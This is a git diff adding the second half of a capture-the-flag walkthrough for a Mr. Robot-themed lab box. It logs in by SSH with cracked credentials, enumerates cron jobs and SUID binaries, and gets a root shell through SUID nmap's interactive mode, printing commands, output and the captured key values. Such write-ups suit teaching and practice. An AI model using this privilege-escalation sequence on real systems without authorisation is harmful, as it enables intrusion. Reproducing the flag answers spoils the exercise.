@@ -86,3 +86,76 @@ Based on the Mr. Robot show, can you root this box?
     - `hashcat password.raw-md5 /usr/share/wordlists/rockyou.txt`
 - Login for user *robot*:
     - robot:abcdefghijklmnopqrstuvwxyz
+
+### Execution
+
+- Connect using new credentials to SSH
+    - `ssh robot@<target ip>`
+
+### Exfiltration
+
+- *robot* account has read permissions for *key-2-of-3.txt*
+- Key 2 is **822c73956184f694993bede3eb39f959**
+
+### Recon
+
+- Check for commands that *robot* can run as *sudo*
+    - `sudo -l`
+    - No commands can be run as sudo
+- Check for exploitable cron jobs
+    - `cat /etc/crontab`
+
+#### Output:
+
+<code>
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+44 * * * * bitnami cd /opt/bitnami/stats && ./agent.bin --run -D
+</code>
+
+- No exploitable cronjobs
+- Check for binaries with SUID bit set
+    - `find / -perm -u=s -type f 2>/dev/null`
+        - `/bin/umount
+    /bin/mount
+    /bin/su
+    /usr/bin/passwd
+    /usr/bin/newgrp
+    /usr/bin/chsh
+    /usr/bin/chfn
+    /usr/bin/gpasswd
+    /usr/bin/sudo
+    /usr/bin/pkexec
+    /usr/local/bin/nmap
+    /usr/lib/openssh/ssh-keysign
+    /usr/lib/eject/dmcrypt-get-device
+    /usr/lib/policykit-1/polkit-agent-helper-1
+    /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+    /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+`
+    - nmap can be exploited via guide on [GTFOBINS](https://gtfobins.org/gtfobins/nmap/)
+
+### Exploitation
+
+- `nmap --interactive`
+- `!/bin/sh`
+- Root shell gained
+- `find / -name "key-3-of-3.txt" 2>/dev/null` to find last flag
+
+### Exfiltration
+
+- `cat /root/key-3-of-3.txt` returns the key: **04787ddef27c3dee1ee161b21670b4e4**
